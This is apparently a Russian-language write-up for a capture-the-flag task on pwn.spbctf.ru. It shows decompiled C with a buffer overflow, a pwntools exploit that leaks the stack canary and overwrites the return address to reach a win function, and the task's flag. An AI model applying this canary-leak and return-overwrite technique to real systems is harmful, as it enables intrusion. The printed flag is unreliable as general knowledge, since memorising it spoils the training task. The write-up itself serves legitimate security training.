[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc8)
Описание:
Нужно ликнуть канарейку и перетереть адрес возврата
`nc 109.233.56.90 11609`
**[string_leak](https://pwn.spbctf.ru/files/canary/string_leak)**

Необходимо произвести два ввода:
1. Перезаписать первый байт канарейки (нуль байт), чтобы она вывелась в терминал, а затем считать её.
2. Переполнить буфер, перезаписать канарейку и адрес возврата.
``` c
void __cdecl play()
{
  char buffer[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(40u);

  puts("We can leak canary with a C string!!");
  while ( 1 )
  {
    puts("What is your name?");
    fflush(stdout);
    if ( (int)read(0, buffer, 128u) <= 0 || buffer[0] == 'q' )
      break;
    printf("Hello %s !\n", buffer);
  }
}
```

Эксплоит:
``` python
io = start()

io.sendafter(b"What is your name?\n", b'A' * 25)
io.recvuntil(b'A' * 25)
raw_canary = io.recv(7)
canary = u64(b'\x00' + raw_canary)

ret = 0x401196
win = 0x401186
payload = b'q' + b'A' * 23 + p64(canary) + b'B' * 8 + p64(ret) + p64(win)
io.sendline(payload)

io.interactive()
```
Было необходимо сделать дополнительный ret, чтобы выровнить стек.

Запуск:
![{769021E1-F972-422A-AAC1-9864A3F82EE6}](../../../../z.%20Images/{769021E1-F972-422A-AAC1-9864A3F82EE6}.png)

Ответ: `spbctf{c4fd0af3ece2959fd12e615bb913bda7}`